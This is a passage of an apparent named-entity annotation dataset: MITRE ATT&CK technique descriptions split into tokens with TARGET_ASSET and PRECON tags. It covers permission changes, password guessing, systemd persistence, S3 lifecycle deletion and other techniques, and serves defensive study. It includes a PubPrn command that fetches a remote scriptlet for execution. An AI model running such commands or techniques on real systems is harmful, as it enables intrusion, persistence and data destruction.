use O
[Security O
Software O
Discovery](https://attack.mitre.org/techniques/T1518/001) O
and O
other O
[Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) O
activities O
to O
both O
discover O
and O
verify O
existing O
exclusions O
in O
a O
victim O
environment O
. O 


Adversaries O
may O
modify O
file B-TARGET_ASSET
or O
directory B-TARGET_ASSET
permissions/attributes I-TARGET_ASSET
to O
evade O
access O
control O
lists B-TARGET_ASSET
( I-TARGET_ASSET
ACLs I-TARGET_ASSET
) I-TARGET_ASSET
and O
access O
protected O
files B-TARGET_ASSET
. O 

(Citation: O
Hybrid O
Analysis O
Icacls1 O
June O
2018)(Citation: O
Hybrid O
Analysis O
Icacls2 O
May O
2018) O
File B-TARGET_ASSET
and O
directory B-TARGET_ASSET
permissions I-TARGET_ASSET
are O
commonly O
managed O
by O
ACLs B-TARGET_ASSET
configured B-PRECON
by I-PRECON
the I-PRECON
file I-PRECON
or I-PRECON
directory I-PRECON
owner I-PRECON
, O
or O
users O
with O
the O
appropriate O
permissions O
. O 

File B-TARGET_ASSET
and O
directory B-TARGET_ASSET
ACL I-TARGET_ASSET
implementations I-TARGET_ASSET
vary O
by O
platform O
, O
but O
generally O
explicitly O
designate O
which O
users O
or O
groups O
can O
perform O
which O
actions O
(read, O
write, O
execute, O
etc.) O
. O 


Most O
Linux O
and O
Linux-based O
platforms O
provide O
a O
standard O
set O
of O
permission O
groups O
(user, O
group, O
and O
other) O
and O
a O
standard O
set O
of O
permissions O
(read, O
write, O
and O
execute) O
that O
are O
applied O
to O
each O
group O
. O 

While O
nuances O
of O
each O
platform’s O
permissions O
implementation O
may O
vary O
, O
most O
of O
the O
platforms O
provide O
two O
primary O
commands O
used O
to O
manipulate O
file B-TARGET_ASSET
and O
directory B-TARGET_ASSET
ACLs I-TARGET_ASSET
: O
<code>chown</code> O
(short O
for O
change O
owner) O
, O
and O
<code>chmod</code> O
(short O
for O
change O
mode) O
. O 


Adversarial O
may O
use O
these O
commands O
to O
make O
themselves O
the O
owner O
of O
files B-TARGET_ASSET
and O
directories B-TARGET_ASSET
or O
change O
the O
mode O
if O
current O
permissions O
allow O
it O
. O 

They O
could O
subsequently O
lock O
others O
out O
of O
the O
file B-TARGET_ASSET
. O 

Specific O
file B-TARGET_ASSET
and O
directory B-TARGET_ASSET
modifications I-TARGET_ASSET
may O
be O
a O
required O
step O
for O
many O
techniques O
, O
such O
as O
establishing O
Persistence O
via O
[Unix O
Shell O
Configuration O
Modification](https://attack.mitre.org/techniques/T1546/004) O
or O
tainting/hijacking O
other O
instrumental O
binary/configuration O
files B-TARGET_ASSET
via O
[Hijack O
Execution O
Flow](https://attack.mitre.org/techniques/T1574) O
. O 

(Citation: O
20 O
macOS O
Common O
Tools O
and O
Techniques) O

Adversaries O
with O
no B-PRECON
prior I-PRECON
knowledge I-PRECON
of I-PRECON
legitimate I-PRECON
credentials B-TARGET_ASSET
within O
the O
system O
or O
environment O
may O
guess O
passwords B-TARGET_ASSET
to O
attempt O
access O
to O
accounts B-TARGET_ASSET
. O 

Without O
knowledge O
of O
the O
password O
for O
an O
account B-TARGET_ASSET
, O
an O
adversary O
may O
opt O
to O
systematically O
guess O
the O
password B-TARGET_ASSET
using O
a O
repetitive O
or O
iterative O
mechanism O
. O 

An O
adversary O
may O
guess O
login O
credentials B-TARGET_ASSET
without O
prior O
knowledge O
of O
system O
or O
environment O
passwords O
during O
an O
operation O
by O
using O
a O
list O
of O
common O
passwords O
. O 

Password O
guessing O
may O
or O
may O
not O
take O
into O
account O
the O
target's O
policies O
on O
password O
complexity O
or O
use O
policies O
that O
may O
lock O
accounts B-TARGET_ASSET
out O
after O
a O
number O
of O
failed O
attempts O
. O 


Guessing O
passwords B-TARGET_ASSET
can O
be O
a O
risky O
option O
because O
it O
could O
cause O
numerous O
authentication O
failures O
and O
account B-TARGET_ASSET
lockouts I-TARGET_ASSET
, O
depending O
on O
the O
organization's O
login O
failure O
policies O
. O 

(Citation: O
Cylance O
Cleaver) O

Typically O
, O
management O
services B-TARGET_ASSET
over O
commonly O
used O
ports B-TARGET_ASSET
are O
used O
when O
guessing O
passwords B-TARGET_ASSET
. O 

Commonly O
targeted O
services B-TARGET_ASSET
include O
the O
following O
: O

* O
SSH B-TARGET_ASSET
(22/TCP) O
* O
Telnet B-TARGET_ASSET
(23/TCP) O
* O
FTP B-TARGET_ASSET
(21/TCP) O
* O
NetBIOS B-TARGET_ASSET
/ O
SMB B-TARGET_ASSET
/ O
Samba B-TARGET_ASSET
(139/TCP O
& O
445/TCP) O
* O
LDAP B-TARGET_ASSET
(389/TCP) O
* O
Kerberos B-TARGET_ASSET
(88/TCP) O
* O
RDP B-TARGET_ASSET
/ O
Terminal B-TARGET_ASSET
Services I-TARGET_ASSET
(3389/TCP) O
* O
HTTP/HTTP B-TARGET_ASSET
Management I-TARGET_ASSET
Services I-TARGET_ASSET
(80/TCP O
& O
443/TCP) O
* O
MSSQL B-TARGET_ASSET
(1433/TCP) O
* O
Oracle B-TARGET_ASSET
(1521/TCP) O
* O
MySQL B-TARGET_ASSET
(3306/TCP) O
* O
VNC B-TARGET_ASSET
(5900/TCP) O
* O
SNMP B-TARGET_ASSET
(161/UDP O
and O
162/TCP/UDP) O

In O
addition O
to O
management O
services B-TARGET_ASSET
, O
adversaries O
may O
""target O
single O
sign-on O
(SSO) O
and O
cloud-based O
applications B-TARGET_ASSET
utilizing O
federated O
authentication O
protocols B-TARGET_ASSET
,"" O
as O
well O
as O
externally O
facing O
email B-TARGET_ASSET
applications I-TARGET_ASSET
, O
such O
as O
Office O
365 O
. O 

(Citation: O
US-CERT O
TA18-068A O
2018) O
. O 

Further O
, O
adversaries O
may O
abuse O
network B-TARGET_ASSET
device I-TARGET_ASSET
interfaces I-TARGET_ASSET
(such O
as O
`wlanAPI`) O
to O
brute O
force O
accessible O
wifi-router(s) B-TARGET_ASSET
via O
wireless O
authentication O
protocols B-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro O
Emotet O
2020) O

In O
default O
environments O
, O
LDAP B-TARGET_ASSET
and O
Kerberos B-TARGET_ASSET
connection O
attempts O
are O
less O
likely O
to O
trigger O
events O
over O
SMB B-TARGET_ASSET
, O
which O
creates O
Windows O
""logon O
failure"" O
event O
ID O
4625 O
. O 


Adversaries O
may O
use O
PubPrn B-TARGET_ASSET
to O
proxy O
execution O
of O
malicious O
remote O
files B-TARGET_ASSET
. O 

PubPrn.vbs B-TARGET_ASSET
is O
a O
[Visual B-TARGET_ASSET
Basic](https://attack.mitre.org/techniques/T1059/005) I-TARGET_ASSET
script I-TARGET_ASSET
that O
publishes O
a O
printer B-TARGET_ASSET
to O
Active B-TARGET_ASSET
Directory I-TARGET_ASSET
Domain I-TARGET_ASSET
Services I-TARGET_ASSET
. O 

The O
script B-TARGET_ASSET
may O
be O
signed B-PRECON
by I-PRECON
Microsoft I-PRECON
and O
is O
commonly O
executed O
through O
the O
[Windows B-TARGET_ASSET
Command I-TARGET_ASSET
Shell](https://attack.mitre.org/techniques/T1059/003) I-TARGET_ASSET
via O
<code>Cscript.exe</code> B-TARGET_ASSET
. O 

For O
example O
, O
the O
following O
code O
publishes O
a O
printer B-TARGET_ASSET
within O
the O
specified O
domain O
: O
<code>cscript O
pubprn O
Printer1 O
LDAP://CN=Container1,DC=Domain1,DC=Com</code> O
. O 

(Citation: O
pubprn) O

Adversaries O
may O
abuse O
PubPrn B-TARGET_ASSET
to O
execute O
malicious O
payloads B-TARGET_ASSET
hosted B-PRECON
on I-PRECON
remote I-PRECON
sites I-PRECON
. O 

(Citation: O
Enigma0x3 O
PubPrn O
Bypass) O
To O
do O
so O
, O
adversaries O
may O
set O
the O
second O
<code>script:</code> O
parameter O
to O
reference O
a O
scriptlet B-TARGET_ASSET
file I-TARGET_ASSET
( I-TARGET_ASSET
.sct I-TARGET_ASSET
) I-TARGET_ASSET
hosted B-PRECON
on I-PRECON
a I-PRECON
remote I-PRECON
site I-PRECON
. O 

An O
example O
command O
is O
<code>pubprn.vbs O
127.0.0.1 O
script:https://mydomain.com/folder/file.sct</code> O
. O 

This O
behavior O
may O
bypass O
signature O
validation O
restrictions O
and O
application B-TARGET_ASSET
control I-TARGET_ASSET
solutions I-TARGET_ASSET
that O
do O
not O
account O
for O
abuse O
of O
this O
script B-TARGET_ASSET
. O 


In O
later O
versions O
of O
Windows O
(10+) O
, O
<code>PubPrn.vbs</code> B-TARGET_ASSET
has O
been O
updated B-PRECON
to O
prevent O
proxying O
execution O
from O
a O
remote O
site O
. O 

This O
is O
done O
by O
limiting O
the O
protocol O
specified O
in O
the O
second O
parameter O
to O
<code>LDAP://</code> O
, O
vice O
the O
<code>script:</code> O
moniker O
which O
could O
be O
used O
to O
reference O
remote O
code O
via O
HTTP(S) O
. O 


Adversaries O
may O
purchase O
technical O
information O
about O
victims O
that O
can O
be O
used O
during O
targeting O
. O 

Information O
about O
victims O
may O
be O
available B-PRECON
for O
purchase O
within O
reputable O
private O
sources O
and O
databases B-TARGET_ASSET
, O
such O
as O
paid O
subscriptions O
to O
feeds O
of O
scan O
databases B-TARGET_ASSET
or O
other O
data O
aggregation O
services B-TARGET_ASSET
. O 

Adversaries O
may O
also O
purchase O
information O
from O
less-reputable O
sources O
such O
as O
dark O
web O
or O
cybercrime O
blackmarkets O
. O 


Adversaries O
may O
purchase O
information O
about O
their O
already O
identified O
targets O
, O
or O
use O
purchased O
data O
to O
discover O
opportunities O
for O
successful O
breaches O
. O 

Threat O
actors O
may O
gather O
various O
technical O
details O
from O
purchased O
data O
, O
including O
but O
not O
limited O
to O
employee O
contact O
information O
, O
credentials B-TARGET_ASSET
, O
or O
specifics O
regarding O
a O
victim’s O
infrastructure B-TARGET_ASSET
. O 

(Citation: O
ZDNET O
Selling O
Data) O
Information O
from O
these O
sources O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
or O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133) O
or O
[Valid O
Accounts](https://attack.mitre.org/techniques/T1078)) O
. O 


Adversaries O
may O
abuse O
various O
implementations O
of O
JavaScript B-TARGET_ASSET
for O
execution O
. O 

JavaScript B-TARGET_ASSET
( I-TARGET_ASSET
JS I-TARGET_ASSET
) I-TARGET_ASSET
is O
a O
platform-independent O
scripting O
language O
(compiled O
just-in-time O
at O
runtime) O
commonly O
associated O
with O
scripts B-TARGET_ASSET
in O
webpages B-TARGET_ASSET
, O
though O
JS B-TARGET_ASSET
can O
be O
executed O
in O
runtime B-TARGET_ASSET
environments I-TARGET_ASSET
outside O
the O
browser B-TARGET_ASSET
. O 

(Citation: O
NodeJS) O

JScript B-TARGET_ASSET
is O
the O
Microsoft O
implementation O
of O
the O
same O
scripting O
standard O
. O 

JScript B-TARGET_ASSET
is O
interpreted O
via O
the O
Windows B-TARGET_ASSET
Script I-TARGET_ASSET
engine I-TARGET_ASSET
and O
thus O
integrated B-PRECON
with I-PRECON
many I-PRECON
components I-PRECON
of I-PRECON
Windows I-PRECON
such O
as O
the O
[Component B-TARGET_ASSET
Object I-TARGET_ASSET
Model](https://attack.mitre.org/techniques/T1559/001) I-TARGET_ASSET
and O
Internet B-TARGET_ASSET
Explorer I-TARGET_ASSET
HTML I-TARGET_ASSET
Application I-TARGET_ASSET
( I-TARGET_ASSET
HTA I-TARGET_ASSET
) I-TARGET_ASSET
pages I-TARGET_ASSET
. O 

(Citation: O
JScrip O
May O
2018)(Citation: O
Microsoft O
JScript O
2007)(Citation: O
Microsoft O
Windows O
Scripts) O

JavaScript B-TARGET_ASSET
for I-TARGET_ASSET
Automation I-TARGET_ASSET
( I-TARGET_ASSET
JXA I-TARGET_ASSET
) I-TARGET_ASSET
is O
a O
macOS O
scripting B-TARGET_ASSET
language I-TARGET_ASSET
based O
on O
JavaScript B-TARGET_ASSET
, O
included O
as O
part O
of O
Apple’s O
Open B-TARGET_ASSET
Scripting I-TARGET_ASSET
Architecture I-TARGET_ASSET
( I-TARGET_ASSET
OSA I-TARGET_ASSET
) I-TARGET_ASSET
, O
that O
was O
introduced O
in O
OSX O
10.10 O
. O 

Apple’s O
OSA B-TARGET_ASSET
provides O
scripting O
capabilities O
to O
control O
applications B-TARGET_ASSET
, O
interface O
with O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
and O
bridge O
access O
into O
the O
rest O
of O
Apple’s O
internal O
APIs B-TARGET_ASSET
. O 

As O
of O
OSX O
10.10 O
, O
OSA B-TARGET_ASSET
only O
supports O
two O
languages O
, O
JXA B-TARGET_ASSET
and O
[AppleScript](https://attack.mitre.org/techniques/T1059/002) B-TARGET_ASSET
. O 

Scripts B-TARGET_ASSET
can O
be O
executed O
via O
the O
command O
line O
utility B-TARGET_ASSET
<code>osascript</code> I-TARGET_ASSET
, O
they O
can O
be O
compiled O
into O
applications B-TARGET_ASSET
or O
script B-TARGET_ASSET
files I-TARGET_ASSET
via O
<code>osacompile</code> B-TARGET_ASSET
, O
and O
they O
can O
be O
compiled O
and O
executed O
in O
memory B-TARGET_ASSET
of O
other O
programs B-TARGET_ASSET
by O
leveraging O
the O
OSAKit B-TARGET_ASSET
Framework I-TARGET_ASSET
. O 

(Citation: O
Apple O
About O
Mac O
Scripting O
2016)(Citation: O
SpecterOps O
JXA O
2020)(Citation: O
SentinelOne O
macOS O
Red O
Team)(Citation: O
Red O
Canary O
Silver O
Sparrow O
Feb2021)(Citation: O
MDSec O
macOS O
JXA O
and O
VSCode) O

Adversaries O
may O
abuse O
various O
implementations O
of O
JavaScript B-TARGET_ASSET
to O
execute O
various O
behaviors O
. O 

Common O
uses O
include O
hosting O
malicious O
scripts B-TARGET_ASSET
on O
websites B-TARGET_ASSET
as O
part O
of O
a O
[Drive-by B-TARGET_ASSET
Compromise](https://attack.mitre.org/techniques/T1189) I-TARGET_ASSET
or O
downloading O
and O
executing O
these O
script B-TARGET_ASSET
files I-TARGET_ASSET
as O
secondary O
payloads B-TARGET_ASSET
. O 

Since O
these O
payloads B-TARGET_ASSET
are O
text-based B-PRECON
, O
it O
is O
also O
very O
common O
for O
adversaries O
to O
obfuscate O
their O
content O
as O
part O
of O
[Obfuscated O
Files O
or O
Information](https://attack.mitre.org/techniques/T1027) O
. O 


Adversaries O
may O
gather O
information O
about O
the O
victim's O
DNS B-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

DNS B-TARGET_ASSET
information I-TARGET_ASSET
may O
include O
a O
variety O
of O
details O
, O
including O
registered O
name O
servers B-TARGET_ASSET
as O
well O
as O
records B-TARGET_ASSET
that O
outline O
addressing O
for O
a O
target’s O
subdomains B-TARGET_ASSET
, O
mail B-TARGET_ASSET
servers I-TARGET_ASSET
, O
and O
other O
hosts B-TARGET_ASSET
. O 

DNS B-TARGET_ASSET
MX I-TARGET_ASSET
, O
TXT I-TARGET_ASSET
, O
and O
SPF I-TARGET_ASSET
records I-TARGET_ASSET
may O
also O
reveal O
the O
use O
of O
third O
party O
cloud O
and O
SaaS O
providers O
, O
such O
as O
Office O
365 O
, O
G O
Suite O
, O
Salesforce O
, O
or O
Zendesk O
. O 

(Citation: O
Sean O
Metcalf O
Twitter O
DNS O
Records) O

Adversaries O
may O
gather O
this O
information O
in O
various O
ways O
, O
such O
as O
querying O
or O
otherwise O
collecting O
details O
via O
[DNS/Passive B-TARGET_ASSET
DNS](https://attack.mitre.org/techniques/T1596/001) I-TARGET_ASSET
. O 

DNS B-TARGET_ASSET
information I-TARGET_ASSET
may O
also O
be O
exposed B-PRECON
to O
adversaries O
via O
online O
or O
other O
accessible O
data O
sets O
(ex: O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596)) O
. O 

(Citation: O
DNS O
Dumpster)(Citation: O
Circl O
Passive O
DNS) O
Gathering O
this O
information O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596) O
, O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593) O
, O
or O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595)) O
, O
establishing O
operational O
resources O
(ex: O
[Acquire O
Infrastructure](https://attack.mitre.org/techniques/T1583) O
or O
[Compromise O
Infrastructure](https://attack.mitre.org/techniques/T1584)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133)) O
. O 


Adversaries O
may O
also O
use O
DNS B-TARGET_ASSET
zone I-TARGET_ASSET
transfer I-TARGET_ASSET
(DNS O
query O
type O
AXFR) O
to O
collect O
all O
records B-TARGET_ASSET
from O
a O
misconfigured B-PRECON
DNS B-TARGET_ASSET
server I-TARGET_ASSET
. O 

(Citation: O
Trails-DNS)(Citation: O
DNS-CISA)(Citation: O
Alexa-dns) O

Systemd B-TARGET_ASSET
services I-TARGET_ASSET
can O
be O
used O
to O
establish O
persistence O
on O
a O
Linux O
system B-TARGET_ASSET
. O 

The O
systemd B-TARGET_ASSET
service I-TARGET_ASSET
manager I-TARGET_ASSET
is O
commonly O
used O
for O
managing O
background O
daemon B-TARGET_ASSET
processes I-TARGET_ASSET
(also O
known O
as O
services B-TARGET_ASSET
) O
and O
other O
system B-TARGET_ASSET
resources I-TARGET_ASSET
. O 

(Citation: O
Linux O
man-pages: O
systemd O
January O
2014)(Citation: O
Freedesktop.org O
Linux O
systemd O
29SEP2018) O
Systemd B-TARGET_ASSET
is O
the O
default B-PRECON
initialization I-PRECON
( I-PRECON
init I-PRECON
) I-PRECON
system I-TARGET_ASSET
on O
many O
Linux O
distributions O
starting O
with O
Debian O
8, O
Ubuntu O
15.04, O
CentOS O
7, O
RHEL O
7, O
Fedora O
15, O
and O
replaces O
legacy O
init B-TARGET_ASSET
systems I-TARGET_ASSET
including O
SysVinit B-TARGET_ASSET
and O
Upstart B-TARGET_ASSET
while O
remaining O
backwards B-PRECON
compatible I-PRECON
with I-PRECON
the I-PRECON
aforementioned I-PRECON
init I-PRECON
systems I-TARGET_ASSET
. O 


Systemd B-TARGET_ASSET
utilizes O
configuration B-TARGET_ASSET
files I-TARGET_ASSET
known O
as O
service B-TARGET_ASSET
units I-TARGET_ASSET
to O
control O
how O
services B-TARGET_ASSET
boot O
and O
under O
what O
conditions O
. O 

By O
default O
, O
these O
unit B-TARGET_ASSET
files I-TARGET_ASSET
are O
stored B-PRECON
in O
the O
<code>/etc/systemd/system</code> O
and O
<code>/usr/lib/systemd/system</code> O
directories O
and O
have O
the O
file O
extension O
<code>.service</code> O
. O 

Each O
service B-TARGET_ASSET
unit I-TARGET_ASSET
file I-TARGET_ASSET
may O
contain O
numerous O
directives O
that O
can O
execute O
system O
commands O
. O 


* O
ExecStart, O
ExecStartPre, O
and O
ExecStartPost O
directives O
cover O
execution O
of O
commands O
when O
a O
services B-TARGET_ASSET
is O
started O
manually O
by O
'systemctl' O
or O
on O
system O
start O
if O
the O
service B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
automatically I-PRECON
start I-PRECON
. O 

* O
ExecReload O
directive O
covers O
when O
a O
service B-TARGET_ASSET
restarts O
. O 

* O
ExecStop O
and O
ExecStopPost O
directives O
cover O
when O
a O
service B-TARGET_ASSET
is O
stopped O
or O
manually O
by O
'systemctl' O
. O 


Adversaries O
have O
used O
systemd B-TARGET_ASSET
functionality O
to O
establish O
persistent O
access O
to O
victim O
systems B-TARGET_ASSET
by O
creating O
and/or O
modifying O
service B-TARGET_ASSET
unit I-TARGET_ASSET
files I-TARGET_ASSET
that O
cause O
systemd B-TARGET_ASSET
to O
execute O
malicious O
commands O
at O
recurring O
intervals O
, O
such O
as O
at O
system O
boot O
. O 

(Citation: O
Anomali O
Rocke O
March O
2019)(Citation: O
gist O
Arch O
package O
compromise O
10JUL2018)(Citation: O
Arch O
Linux O
Package O
Systemd O
Compromise O
BleepingComputer O
10JUL2018)(Citation: O
acroread O
package O
compromised O
Arch O
Linux O
Mail O
8JUL2018) O

While O
adversaries O
typically O
require O
root O
privileges O
to O
create/modify O
service B-TARGET_ASSET
unit I-TARGET_ASSET
files I-TARGET_ASSET
in O
the O
<code>/etc/systemd/system</code> O
and O
<code>/usr/lib/systemd/system</code> O
directories O
, O
low O
privilege O
users O
can O
create/modify O
service B-TARGET_ASSET
unit I-TARGET_ASSET
files I-TARGET_ASSET
in O
directories O
such O
as O
<code>~/.config/systemd/user/</code> O
to O
achieve O
user-level O
persistence O
. O 

(Citation: O
Rapid7 O
Service O
Persistence O
22JUNE2016) O

Adversaries O
may O
modify O
the O
lifecycle B-TARGET_ASSET
policies I-TARGET_ASSET
of O
a O
cloud B-TARGET_ASSET
storage I-TARGET_ASSET
bucket I-TARGET_ASSET
to O
destroy O
all O
objects B-TARGET_ASSET
stored O
within O
. O 


Cloud B-TARGET_ASSET
storage I-TARGET_ASSET
buckets I-TARGET_ASSET
often O
allow O
users O
to O
set O
lifecycle B-TARGET_ASSET
policies I-TARGET_ASSET
to O
automate O
the O
migration O
, O
archival O
, O
or O
deletion O
of O
objects B-TARGET_ASSET
after O
a O
set O
period O
of O
time O
. O 

(Citation: O
AWS O
Storage O
Lifecycles)(Citation: O
GCP O
Storage O
Lifecycles)(Citation: O
Azure O
Storage O
Lifecycles) O
If O
a O
threat O
actor O
has O
sufficient B-PRECON
permissions I-PRECON
to O
modify O
these O
policies B-TARGET_ASSET
, O
they O
may O
be O
able O
to O
delete O
all O
objects B-TARGET_ASSET
at O
once O
. O 


For O
example O
, O
in O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
an O
adversary O
with O
the O
`PutLifecycleConfiguration` O
permission O
may O
use O
the O
`PutBucketLifecycle` B-TARGET_ASSET
API I-TARGET_ASSET
call I-TARGET_ASSET
to O
apply O
a O
lifecycle B-TARGET_ASSET
policy I-TARGET_ASSET
to O
an O
S3 B-TARGET_ASSET
bucket I-TARGET_ASSET
that O
deletes O
all O
objects B-TARGET_ASSET
in O
the O
bucket B-TARGET_ASSET
after O
one O
day O
. O 

(Citation: O
Palo O
Alto O
Cloud O
Ransomware)(Citation: O
Halcyon O
AWS O
Ransomware O
2025) O
In O
addition O
to O
destroying O
data B-TARGET_ASSET
for O
purposes O
of O
extortion O
and O
[Financial O
Theft](https://attack.mitre.org/techniques/T1657) O
, O
adversaries O
may O
also O
perform O
this O
action O
on O
buckets B-TARGET_ASSET
storing O
cloud B-TARGET_ASSET
logs I-TARGET_ASSET
for O
[Indicator O
Removal](https://attack.mitre.org/techniques/T1070) O
. O 

(Citation: O
Datadog O
S3 O
Lifecycle O
CloudTrail O
Logs) O

Adversaries O
may O
leverage O
the O
AuthorizationExecuteWithPrivileges B-TARGET_ASSET
API I-TARGET_ASSET
to O
escalate O
privileges O
by O
prompting O
the O
user O
for O
credentials O
. O 

(Citation: O
AppleDocs O
AuthorizationExecuteWithPrivileges) O
The O
purpose O
of O
this O
API B-TARGET_ASSET
is O
to O
give O
application O
developers O
an O
easy O
way O
to O
perform O
operations O
with O
root O
privileges O
, O
such O
as O
for O
application O
installation O
or O
updating O
. O 

This O
API B-TARGET_ASSET
does O
not O
validate O
that O
the O
program B-TARGET_ASSET
requesting O
root O
privileges O
comes O
from O
a O
reputable O
source O
or O
has O
been O
maliciously O
modified O
. O 

Although O
this O
API B-TARGET_ASSET
is O
deprecated B-PRECON
, O
it O
still O
fully O
functions O
in O
the O
latest O
releases O
of O
macOS O
. O 

When O
calling O
this O
API B-TARGET_ASSET
, O
the O
user O
will O
be O
prompted O
to O
enter O
their O
credentials O
but O
no O
checks O
on O
the O
origin O
or O
integrity O
of O
the O
program B-TARGET_ASSET
are O
made O
. O 

The O
program B-TARGET_ASSET
calling O
the O
API B-TARGET_ASSET
may O
also O
load O
world B-PRECON
writable I-PRECON
files B-TARGET_ASSET
which O
can O
be O
modified O
to O
perform O
malicious O
behavior O
with O
elevated O
privileges O
. O 


Adversaries O
may O
abuse O
AuthorizationExecuteWithPrivileges B-TARGET_ASSET
to O
obtain O
root O
privileges O
in O
order O
to O
install O
malicious O
software B-TARGET_ASSET
on O
victims O
and O
install O
persistence O
mechanisms O
. O 

(Citation: O
Death O
by O
1000 O
installers; O
it's O
all O
broken!)(Citation: O
Carbon O
Black O
Shlayer O
Feb O
2019)(Citation: O
OSX O
Coldroot O
RAT) O
This O
technique O
may O
be O
combined O
with O
[Masquerading](https://attack.mitre.org/techniques/T1036) O
to O
trick O
the O
user O
into O
granting O
escalated O
privileges O
to O
malicious O
code O
. O 

(Citation: O
Death O
by O
1000 O
installers; O
it's O
all O
broken!)(Citation: O
Carbon O
Black O
Shlayer O
Feb O
2019) O
This O
technique O
has O
also O
been O
shown O
to O
work O
by O
modifying O
legitimate O
programs B-TARGET_ASSET
present O
on O
the O
machine O
that O
make O
use O
of O
this O
API B-TARGET_ASSET
. O 

(Citation: O
Death O
by O
1000 O
installers; O
it's O
all O
broken!) O

An O
adversary O
can O
leverage O
a O
computer's O
peripheral B-TARGET_ASSET
devices I-TARGET_ASSET
(e.g., O
microphones B-TARGET_ASSET
and O
webcams B-TARGET_ASSET
) O
or O
applications B-TARGET_ASSET
(e.g., O
voice O
and O
video O
call O
services B-TARGET_ASSET
) O
to O
capture O
audio B-TARGET_ASSET
recordings I-TARGET_ASSET
for O
the O
purpose O
of O
listening O
into O
sensitive O
conversations O
to O
gather O
information O
. O 

(Citation: O
ESET O
Attor O
Oct O
2019) O

Malware B-TARGET_ASSET
or O
scripts B-TARGET_ASSET
may O
be O
used O
to O
interact O
with O
the O
devices B-TARGET_ASSET
through O
an O
available B-PRECON
API B-TARGET_ASSET
provided O
by O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
or O
an O
application B-TARGET_ASSET
to O
capture O
audio B-TARGET_ASSET
. O 

Audio B-TARGET_ASSET
files I-TARGET_ASSET
may O
be O
written O
to O
disk B-TARGET_ASSET
and O
exfiltrated O
later O
. O 


Adversaries O
may O
create O
or O
modify O
system-level B-TARGET_ASSET
processes I-TARGET_ASSET
to O
repeatedly O
execute O
malicious O
payloads B-TARGET_ASSET
as O
part O
of O
persistence O
. O 

When O
operating B-TARGET_ASSET
systems I-TARGET_ASSET
boot O
up O
, O
they O
can O
start O
processes B-TARGET_ASSET
that O
perform O
background O
system O
functions O
. O 


On O
Windows O
and O
Linux O
, O
these O
system B-TARGET_ASSET
processes I-TARGET_ASSET
are O
referred O
to O
as O
services B-TARGET_ASSET
. O 

(Citation: O
TechNet O
Services) O
On O
macOS O
, O
launchd B-TARGET_ASSET
processes I-TARGET_ASSET
known O
as O
[Launch B-TARGET_ASSET
Daemon](https://attack.mitre.org/techniques/T1543/004) I-TARGET_ASSET
and O
[Launch B-TARGET_ASSET
Agent](https://attack.mitre.org/techniques/T1543/001) I-TARGET_ASSET
are O
run O
to O
finish O
system O
initialization O
and O
load O
user O
specific O
parameters O
. O 

(Citation: O
AppleDocs O
Launch O
Agent O
Daemons) O

Adversaries O
may O
install O
new O
services B-TARGET_ASSET
, O
daemons B-TARGET_ASSET
, O
or O
agents B-TARGET_ASSET
that O
can O
be O
configured B-PRECON
to I-PRECON
execute I-PRECON
at I-PRECON
startup I-PRECON
or O
a O
repeatable O
interval O
in O
order O
to O
establish O
persistence O
. O 

Similarly O
, O
adversaries O
may O
modify O
existing O
services B-TARGET_ASSET
, O
daemons B-TARGET_ASSET
, O
or O
agents B-TARGET_ASSET
to O
achieve O
the O
same O
effect O
. O 

Services B-TARGET_ASSET
, O
daemons B-TARGET_ASSET
, O
or O
agents B-TARGET_ASSET
may O
be O
created O
with O
administrator O
privileges O
but O
executed O
under O
root/SYSTEM O
privileges O
. O 

Adversaries O
may O
leverage O
this O
functionality O
to O
create O
or O
modify O
system B-TARGET_ASSET
processes I-TARGET_ASSET
in O
order O
to O
escalate O
privileges O
. O 

(Citation: O
OSX O
Malware O
Detection) O

Adversaries O
may O
leverage O
external-facing B-PRECON
remote B-TARGET_ASSET
services I-TARGET_ASSET
to O
initially O
access O
and/or O
persist O
within O
a O
network B-TARGET_ASSET
. O 

Remote O
services B-TARGET_ASSET
such O
as O
VPNs B-TARGET_ASSET
, O
Citrix B-TARGET_ASSET
, O
and O
other O
access O
mechanisms B-TARGET_ASSET
allow O
users O
to O
connect O
to O
internal O
enterprise O
network B-TARGET_ASSET
resources I-TARGET_ASSET
from O
external O
locations O
. O 

There O
are O
often O
remote O
service B-TARGET_ASSET
gateways I-TARGET_ASSET
that O
manage O
connections O
and O
credential O
authentication O
for O
these O
services B-TARGET_ASSET
. O 

Services B-TARGET_ASSET
such O
as O
[Windows B-TARGET_ASSET
Remote I-TARGET_ASSET
Management](https://attack.mitre.org/techniques/T1021/006) I-TARGET_ASSET
and O
[VNC](https://attack.mitre.org/techniques/T1021/005) B-TARGET_ASSET
can O
also O
be O
used O
externally O
. O 

(Citation: O
MacOS O
VNC O
software O
for O
Remote O
Desktop) O

Access O
to O
[Valid O
Accounts](https://attack.mitre.org/techniques/T1078) O
to O
use O
the O
service B-TARGET_ASSET
is O
often O
a O
requirement O
, O
which O
could O
be O
obtained O
through O
credential O
pharming O
or O
by O
obtaining O
the O
credentials B-TARGET_ASSET
from O
users O
after O
compromising O
the O
enterprise O
network B-TARGET_ASSET
. O 

(Citation: O
Volexity O
Virtual O
Private O
Keylogging) O
Access O
to O
